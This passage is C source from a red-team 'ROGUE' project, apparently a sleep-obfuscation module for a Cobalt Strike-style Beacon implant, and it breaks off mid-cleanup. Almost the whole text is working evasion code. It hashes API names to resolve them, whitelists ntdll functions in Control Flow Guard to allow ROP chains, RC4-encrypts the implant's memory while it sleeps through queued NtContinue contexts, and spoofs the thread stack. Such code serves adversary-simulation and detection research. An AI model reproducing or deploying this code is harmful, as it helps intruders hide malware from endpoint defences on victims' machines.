/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
!*/

#include "Common.h"

typedef struct
{
	/* APIS */
	D_API( ConvertThreadToFiber );
	D_API( ConvertFiberToThread );
	D_API( RtlInitUnicodeString );
	D_API( SwitchToFiber );
	D_API( LdrUnloadDll );
	D_API( CreateFiber );
	D_API( DeleteFiber );
	D_API( LdrLoadDll );

	/* Fibers */
	PVOID	Master;
	PVOID	Slave;

	PVOID	Buffer;
	SIZE_T	Length;
	ULONG	Time;
} F_PARAM, *PF_PARAM; 

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING, *PUSTRING;

BOOLEAN
NTAPI
SystemFunction036(
	IN PVOID Buffer,
	IN ULONG Length
);

NTSTATUS
NTAPI
SystemFunction032(
	IN PUSTRING Buffer,
	IN PUSTRING Key
);

typedef struct
{
	D_API( NtSignalAndWaitForSingleObject );
	D_API( SetProcessValidCallTargets );
	D_API( NtProtectVirtualMemory );
	D_API( LdrGetProcedureAddress );
	D_API( NtWaitForSingleObject );
	D_API( WaitForSingleObjectEx );
	D_API( RtlInitUnicodeString );
	D_API( NtAlertResumeThread );
	D_API( NtGetContextThread );
	D_API( NtSetContextThread );
	D_API( NtTerminateThread );
	D_API( RtlInitAnsiString );
	D_API( SystemFunction036 );
	D_API( SystemFunction032 );
	D_API( RtlExitUserThread );
	D_API( NtDuplicateObject );
	D_API( NtQueueApcThread );
	D_API( NtCreateThreadEx );
	D_API( RtlAllocateHeap );
	D_API( NtCreateEvent );
	D_API( NtOpenThread );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( NtTestAlert );
	D_API( LdrLoadDll );
	D_API( NtContinue );
	D_API( NtClose );
} API ;

#define H_API_NTSIGNALANDWAITFORSINGLEOBJECT	0x78983aed /* NtSignalAndWaitForSingleObject */
#define H_API_SETPROCESSVALIDCALLTARGETS	0x647d9236 /* SetProcessValidCallTargets */
#define H_API_NTPROTECTVIRTUALMEMORY		0x50e92888 /* NtProtectVirtualMemory */
#define H_API_LDRGETPROCEDUREADDRESS		0xfce76bb6 /* LdrGetProcedureAddress */
#define H_API_NTWAITFORSINGLEOBJECT		0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_CONVERTTHREADTOFIBER		0x826ce4e9 /* ConvertThreadToFiber */
#define H_API_CONVERTFIBERTOTHREAD		0x11b30049 /* ConvertFiberToThread */
#define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
#define H_API_NTALERTRESUMETHREAD		0x5ba11e28 /* NtAlertResumeThread */
#define H_API_NTSETCONTEXTTHREAD		0xffa0bf10 /* NtSetContextThread */
#define H_API_NTGETCONTEXTTHREAD		0x6d22f884 /* NtGetContextThread */
#define H_API_NTTERMINATETHREAD			0xccf58808 /* NtTerminateThread */
#define H_API_RTLINITANSISTRING			0xa0c8436d /* RtlInitAnsiSTring */
#define H_API_RTLEXITUSERTHREAD			0x2f6db5e8 /* RtlExitUserThread */
#define H_API_NTDUPLICATEOBJECT			0x4441d859 /* NtDuplicateObject */
#define H_API_NTQUEUEAPCTHREAD			0x0a6664b8 /* NtQueueApcThread */
#define H_API_NTCREATETHREADEX			0xaf18cfb0 /* NtCreateThreadEx */
#define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
#define H_API_SWITCHTOFIBER			0x14fc3cc2 /* SwitchToFiber */
#define H_API_NTCREATEEVENT			0x28d3233d /* NtCreateEvent */
#define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
#define H_API_NTOPENTHREAD			0x968e0cb1 /* NtOpenThread */
#define H_API_RTLFREEHEAP			0x73a9e4d7 /* RtlFreeHeap */
#define H_API_NTTESTALERT			0x858a32df /* NtTestAlert */
#define H_API_CREATEFIBER			0x687cf681 /* CreateFiber */
#define H_API_DELETEFIBER			0x99beb7a0 /* DeleteFiber */
#define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
#define H_API_NTCONTINUE			0xfc3a6c2c /* NtContinue */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */

#define H_LIB_KERNELBASE			0x03ebb38b /* kernelbase.dll */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Adds a pointer to the CFG exception list to
 * permit ROP gadgets from being marked as 
 * invalid.
 *
!*/

static D_SEC( B ) VOID WINAPI CfgAddAddr( _In_ PVOID ImageBase, _In_ PVOID Function )
{
	API			Api;
	CFG_CALL_TARGET_INFO	Cfg;

	SIZE_T			Len = 0;

	PVOID			Kbs = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );

	Dos = C_PTR( ImageBase );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Len = U_PTR( ( Nth->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 ) );

	if ( ( Kbs = PebGetModule( H_LIB_KERNELBASE ) ) != NULL ) {
		Api.SetProcessValidCallTargets = PeGetFuncEat( Kbs, H_API_SETPROCESSVALIDCALLTARGETS );

		if ( Api.SetProcessValidCallTargets != NULL ) {
			Cfg.Flags  = CFG_CALL_TARGET_VALID;
			Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

			Api.SetProcessValidCallTargets( NtCurrentProcess(), Dos, Len, 1, &Cfg );
		};
	};
};

/*!
 *
 * Purpose:
 *
 * Blocks the input for a specified period of time,
 * and obfuscates Beacon as well as attempts to
 * spoof the thread stack.
 *
!*/

static D_SEC( B ) VOID WINAPI Sleep_Call( _In_ PF_PARAM Fbr )
{
	API			Api;
	USTRING			Rc4;
	USTRING			Key;
	ANSI_STRING		Ani;
	UNICODE_STRING		Uni;

	UCHAR			Rnd[32];

	SIZE_T			Len = 0;
	SIZE_T			Prt = 0;

	HANDLE			Thd = NULL;
	HANDLE			Src = NULL;
	HANDLE			Evt = NULL;
	LPVOID			K32 = NULL;
	LPVOID			Adv = NULL;
	LPVOID			Img = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	PCONTEXT		Ini = NULL;
	PCONTEXT		Cap = NULL;
	PCONTEXT		Spf = NULL;

	PCONTEXT		Beg = NULL;
	PCONTEXT		Set = NULL;
	PCONTEXT		Enc = NULL;
	PCONTEXT		Gt1 = NULL;
	PCONTEXT		St1 = NULL;
	PCONTEXT		Blk = NULL;
	PCONTEXT		Dec = NULL;
	PCONTEXT		Res = NULL;
	PCONTEXT		St2 = NULL;
	PCONTEXT		End = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Rc4, sizeof( Rc4 ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Dos = C_PTR( NtCurrentPeb()->ImageBaseAddress );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

	Img = C_PTR( Fbr->Buffer );
	Len = U_PTR( Fbr->Length );

	Api.NtSignalAndWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
	Api.NtProtectVirtualMemory         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
	Api.LdrGetProcedureAddress         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.NtWaitForSingleObject          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlInitUnicodeString           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.NtAlertResumeThread            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALERTRESUMETHREAD );
	Api.NtGetContextThread             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
	Api.NtTerminateThread              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTTERMINATETHREAD );
	Api.RtlInitAnsiString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.RtlExitUserThread              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERTHREAD );
	Api.NtDuplicateObject              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTDUPLICATEOBJECT );
	Api.NtQueueApcThread               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUEUEAPCTHREAD );
	Api.NtCreateThreadEx               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATETHREADEX );
	Api.RtlAllocateHeap                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.NtCreateEvent                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
	Api.NtOpenThread                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENTHREAD );
	Api.LdrUnloadDll                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.NtTestAlert                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTTESTALERT );
	Api.LdrLoadDll                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
	Api.NtContinue                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
	Api.NtClose                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"kernel32.dll" ) ) );
	Api.LdrLoadDll( NULL, 0, &Uni, &K32 );

	Api.RtlInitUnicodeString( &Uni, C_PTR( G_PTR( L"advapi32.dll" ) ) );
	Api.LdrLoadDll( NULL, 0, &Uni, &Adv );

	if ( K32 != NULL && Adv != NULL ) {

		Api.RtlInitAnsiString( &Ani, C_PTR( G_PTR( "WaitForSingleObjectEx" ) ) );
		Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.WaitForSingleObjectEx );

		Api.RtlInitAnsiString( &Ani, C_PTR( G_PTR( "SystemFunction032" ) ) );
		Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 );

		Api.RtlInitAnsiString( &Ani, C_PTR( G_PTR( "SystemFunction036" ) ) );
		Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction036 );

		Api.SystemFunction036( &Rnd, sizeof( Rnd ) );

		Key.Buffer = &Rnd;
		Key.Length = Key.MaximumLength = sizeof( Rnd );

		Rc4.Buffer = C_PTR( Fbr->Buffer );
		Rc4.Length = Rc4.MaximumLength = U_PTR( Fbr->Length );

		if ( NT_SUCCESS( Api.NtCreateEvent( &Evt, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) ) {
			if ( NT_SUCCESS( Api.NtCreateThreadEx( &Thd, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), C_PTR( U_PTR( Dos ) + Nth->OptionalHeader.AddressOfEntryPoint ), NULL, CREATE_SUSPENDED, 0, 0x1000 * 20, 0x1000 * 20, NULL ) ) ) {
				
				Ini = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( Ini == NULL ) {
					goto Leave;
				};

				Cap = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( Cap == NULL ) {
					goto Leave;
				};

				Spf = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( Spf == NULL ) {
					goto Leave;
				};

				Beg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( Beg == NULL ) {
					goto Leave;
				};

				Set = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( Set == NULL ) {
					goto Leave;
				};

				Enc = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( Enc == NULL ) {
					goto Leave;
				};

				Gt1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( Gt1 == NULL ) {
					goto Leave;
				};

				St1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( St1 == NULL ) {
					goto Leave;
				};

				Blk = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( Blk == NULL ) {
					goto Leave;
				};

				Dec = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( Dec == NULL ) {
					goto Leave;
				};

				Res = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( Res == NULL ) {
					goto Leave;
				};

				St2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( St2 == NULL ) {
					goto Leave;
				};

				End = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
				if ( End == NULL ) {
					goto Leave;
				};

				Ini->ContextFlags = CONTEXT_FULL;
				Cap->ContextFlags = CONTEXT_FULL;
				Spf->ContextFlags = CONTEXT_FULL;

				Beg->ContextFlags = CONTEXT_FULL;
				Set->ContextFlags = CONTEXT_FULL;
				Enc->ContextFlags = CONTEXT_FULL;
				Gt1->ContextFlags = CONTEXT_FULL;
				St1->ContextFlags = CONTEXT_FULL;
				Blk->ContextFlags = CONTEXT_FULL;
				Dec->ContextFlags = CONTEXT_FULL;
				Res->ContextFlags = CONTEXT_FULL;
				St2->ContextFlags = CONTEXT_FULL;
				End->ContextFlags = CONTEXT_FULL;

				if ( NT_SUCCESS( Api.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &Src, THREAD_ALL_ACCESS, 0, 0 ) ) ) {
					if ( NT_SUCCESS( Api.NtGetContextThread( Thd, Ini ) ) ) {
						__builtin_memcpy( Beg, Ini, sizeof( CONTEXT ) );
						__builtin_memcpy( Set, Ini, sizeof( CONTEXT ) );
						__builtin_memcpy( Enc, Ini, sizeof( CONTEXT ) );
						__builtin_memcpy( Gt1, Ini, sizeof( CONTEXT ) );
						__builtin_memcpy( St1, Ini, sizeof( CONTEXT ) );
						__builtin_memcpy( Blk, Ini, sizeof( CONTEXT ) );
						__builtin_memcpy( Dec, Ini, sizeof( CONTEXT ) );
						__builtin_memcpy( Res, Ini, sizeof( CONTEXT ) );
						__builtin_memcpy( St2, Ini, sizeof( CONTEXT ) );
						__builtin_memcpy( End, Ini, sizeof( CONTEXT ) );

#if defined( _WIN64 )
						Beg->ContextFlags = CONTEXT_FULL;
						Beg->Rip  = U_PTR( Api.NtWaitForSingleObject );
						Beg->Rsp -= U_PTR( 0x1000 * 13 );
						Beg->Rcx  = U_PTR( Evt );
						Beg->Rdx  = U_PTR( FALSE );
						Beg->R8   = U_PTR( NULL );
						*( ULONG_PTR volatile * )( Beg->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );

						Set->ContextFlags = CONTEXT_FULL;
						Set->Rip  = U_PTR( Api.NtProtectVirtualMemory );
						Set->Rsp -= U_PTR( 0x1000 * 12 );
						Set->Rcx  = U_PTR( NtCurrentProcess() );
						Set->Rdx  = U_PTR( & Img );
						Set->R8   = U_PTR( & Len );
						Set->R9   = U_PTR( PAGE_READWRITE );
						*( ULONG_PTR volatile * )( Set->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( Set->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = U_PTR( &Prt );

						Enc->ContextFlags = CONTEXT_FULL;
						Enc->Rip  = U_PTR( Api.SystemFunction032 );
						Enc->Rsp -= U_PTR( 0x1000 * 11 );
						Enc->Rcx  = U_PTR( &Rc4 );
						Enc->Rdx  = U_PTR( &Key );
						*( ULONG_PTR volatile * )( Enc->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );

						Gt1->ContextFlags = CONTEXT_FULL;
						Gt1->Rip  = U_PTR( Api.NtGetContextThread );
						Gt1->Rsp -= U_PTR( 0x1000 * 10 );
						Gt1->Rcx  = U_PTR( Src );
						Gt1->Rdx  = U_PTR( Cap );
						*( ULONG_PTR volatile * )( Gt1->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );

						St1->ContextFlags = CONTEXT_FULL;
						St1->Rip  = U_PTR( Api.NtSetContextThread );
						St1->Rsp -= U_PTR( 0x1000 * 9 );
						St1->Rcx  = U_PTR( Src );
						St1->Rdx  = U_PTR( Spf );
						*( ULONG_PTR volatile * )( St1->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );

						Blk->ContextFlags = CONTEXT_FULL;
						Blk->Rip  = U_PTR( Api.WaitForSingleObjectEx );
						Blk->Rsp -= U_PTR( 0x1000 * 8 );
						Blk->Rcx  = U_PTR( Src );
						Blk->Rdx  = U_PTR( Fbr->Time );
						Blk->R8   = U_PTR( FALSE );
						*( ULONG_PTR volatile * )( Blk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );

						Dec->ContextFlags = CONTEXT_FULL;
						Dec->Rip  = U_PTR( Api.SystemFunction032 );
						Dec->Rsp -= U_PTR( 0x1000 * 7 );
						Dec->Rcx  = U_PTR( &Rc4 );
						Dec->Rdx  = U_PTR( &Key );
						*( ULONG_PTR volatile * )( Dec->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );

						Res->ContextFlags = CONTEXT_FULL;
						Res->Rip  = U_PTR( Api.NtProtectVirtualMemory );
						Res->Rsp -= U_PTR( 0x1000 * 6 ); 
						Res->Rcx  = U_PTR( NtCurrentProcess() );
						Res->Rdx  = U_PTR( & Img );
						Res->R8   = U_PTR( & Len );
						Res->R9   = U_PTR( PAGE_EXECUTE_READ );
						*( ULONG_PTR volatile * )( Res->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( Res->Rsp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = U_PTR( &Prt );

						St2->ContextFlags = CONTEXT_FULL;
						St2->Rip  = U_PTR( Api.NtSetContextThread );
						St2->Rsp -= U_PTR( 0x1000 * 5 );
						St2->Rcx  = U_PTR( Src );
						St2->Rdx  = U_PTR( Cap );
						*( ULONG_PTR volatile * )( St2->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );

						End->ContextFlags = CONTEXT_FULL;
						End->Rip  = U_PTR( Api.RtlExitUserThread );
						End->Rsp -= U_PTR( 0x1000 * 4 );
						End->Rcx  = U_PTR( ERROR_SUCCESS );
						*( ULONG_PTR volatile * )( Beg->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
#else
						Beg->ContextFlags = CONTEXT_FULL; 
						Beg->Eip  = U_PTR( Api.NtWaitForSingleObject );
						Beg->Esp -= U_PTR( 0x1000 * 13 );
						*( ULONG_PTR volatile * )( Beg->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( Beg->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( Evt );
						*( ULONG_PTR volatile * )( Beg->Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( FALSE );
						*( ULONG_PTR volatile * )( Beg->Esp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = U_PTR( NULL );

						Set->ContextFlags = CONTEXT_FULL;
						Set->Eip  = U_PTR( Api.NtProtectVirtualMemory );
						Set->Esp -= U_PTR( 0x1000 * 12 );
						*( ULONG_PTR volatile * )( Set->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( Set->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( NtCurrentProcess() );
						*( ULONG_PTR volatile * )( Set->Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( & Img );
						*( ULONG_PTR volatile * )( Set->Esp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = U_PTR( & Len );
						*( ULONG_PTR volatile * )( Set->Esp + ( sizeof( ULONG_PTR ) * 0x4 ) ) = U_PTR( PAGE_READWRITE );
						*( ULONG_PTR volatile * )( Set->Esp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = U_PTR( & Prt );

						Enc->ContextFlags = CONTEXT_FULL;
						Enc->Eip  = U_PTR( Api.SystemFunction032 );
						Enc->Esp -= U_PTR( 0x1000 * 11 );
						*( ULONG_PTR volatile * )( Enc->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( Enc->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( & Rc4 );
						*( ULONG_PTR volatile * )( Enc->Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( & Key );

						Gt1->ContextFlags = CONTEXT_FULL;
						Gt1->Eip  = U_PTR( Api.NtGetContextThread );
						Gt1->Esp -= U_PTR( 0x1000 * 10 );
						*( ULONG_PTR volatile * )( Gt1->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( Gt1->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( Src );
						*( ULONG_PTR volatile * )( Gt1->Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( Cap );

						St1->ContextFlags = CONTEXT_FULL;
						St1->Eip  = U_PTR( Api.NtSetContextThread );
						St1->Esp -= U_PTR( 0x1000 * 9 );
						*( ULONG_PTR volatile * )( St1->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( St1->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( Src );
						*( ULONG_PTR volatile * )( St1->Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( Spf );

						Blk->ContextFlags = CONTEXT_FULL;
						Blk->Eip  = U_PTR( Api.WaitForSingleObjectEx );
						Blk->Esp -= U_PTR( 0x1000 * 8 );
						*( ULONG_PTR volatile * )( Blk->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( Blk->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( Src );
						*( ULONG_PTR volatile * )( Blk->Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( Fbr->Time );
						*( ULONG_PTR volatile * )( Blk->Esp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = U_PTR( FALSE );

						Dec->ContextFlags = CONTEXT_FULL;
						Dec->Eip  = U_PTR( Api.SystemFunction032 );
						Dec->Esp -= U_PTR( 0x1000 * 7 );
						*( ULONG_PTR volatile * )( Dec->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( Dec->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( & Rc4 );
						*( ULONG_PTR volatile * )( Dec->Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( & Key );

						Res->ContextFlags = CONTEXT_FULL;
						Res->Eip  = U_PTR( Api.NtProtectVirtualMemory );
						Res->Esp -= U_PTR( 0x1000 * 6 );
						*( ULONG_PTR volatile * )( Res->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( Res->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( NtCurrentProcess() );
						*( ULONG_PTR volatile * )( Res->Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( & Img );
						*( ULONG_PTR volatile * )( Res->Esp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = U_PTR( & Len );
						*( ULONG_PTR volatile * )( Res->Esp + ( sizeof( ULONG_PTR ) * 0x4 ) ) = U_PTR( PAGE_EXECUTE_READ );
						*( ULONG_PTR volatile * )( Res->Esp + ( sizeof( ULONG_PTR ) * 0x5 ) ) = U_PTR( & Prt );

						St2->ContextFlags = CONTEXT_FULL;
						St2->Eip  = U_PTR( Api.NtSetContextThread );
						St2->Esp -= U_PTR( 0x1000 * 5 );
						*( ULONG_PTR volatile * )( St2->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( St2->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( Src );
						*( ULONG_PTR volatile * )( St2->Esp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = U_PTR( Cap );

						End->ContextFlags = CONTEXT_FULL;
						End->Eip  = U_PTR( Api.RtlExitUserThread );
						End->Esp -= U_PTR( 0x1000 * 4 );
						*( ULONG_PTR volatile * )( End->Esp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Api.NtTestAlert );
						*( ULONG_PTR volatile * )( End->Esp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = U_PTR( ERROR_SUCCESS );
#endif
						if ( ! NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtContinue, C_PTR( Beg ), FALSE, NULL ) ) ) goto Leave;
						if ( ! NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtContinue, C_PTR( Set ), FALSE, NULL ) ) ) goto Leave;
						if ( ! NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtContinue, C_PTR( Enc ), FALSE, NULL ) ) ) goto Leave;
						if ( ! NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtContinue, C_PTR( Gt1 ), FALSE, NULL ) ) ) goto Leave;
						if ( ! NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtContinue, C_PTR( St1 ), FALSE, NULL ) ) ) goto Leave;
						if ( ! NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtContinue, C_PTR( Blk ), FALSE, NULL ) ) ) goto Leave;
						if ( ! NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtContinue, C_PTR( Dec ), FALSE, NULL ) ) ) goto Leave;
						if ( ! NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtContinue, C_PTR( Res ), FALSE, NULL ) ) ) goto Leave;
						if ( ! NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtContinue, C_PTR( St2 ), FALSE, NULL ) ) ) goto Leave;
						if ( ! NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtContinue, C_PTR( End ), FALSE, NULL ) ) ) goto Leave;

						CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );
						CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Api.NtTestAlert );
						CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Api.NtSetContextThread );
						CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Api.NtGetContextThread );
						CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Api.RtlExitUserThread );
						CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Api.NtWaitForSingleObject );
						CfgAddAddr( PebGetModule( H_LIB_NTDLL ), Api.NtProtectVirtualMemory );

						if ( NT_SUCCESS( Api.NtAlertResumeThread( Thd, NULL ) ) ) {

							Spf->ContextFlags = CONTEXT_FULL;
#if defined( _WIN64 )
							Spf->Rip = U_PTR( Api.WaitForSingleObjectEx );
							Spf->Rsp = U_PTR( NtCurrentTeb()->NtTib.StackBase );
#else
							Spf->Eip = U_PTR( Api.WaitForSingleObjectEx );
							Spf->Esp = U_PTR( NtCurrentTeb()->NtTib.StackBase );
#endif

							Api.NtSignalAndWaitForSingleObject( Evt, Thd, FALSE, NULL );
						};
					};
				};
			};
		};
	};
Leave:
	if ( End != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, End );
		End = NULL;
	};
	if ( St2 != NULL ) {
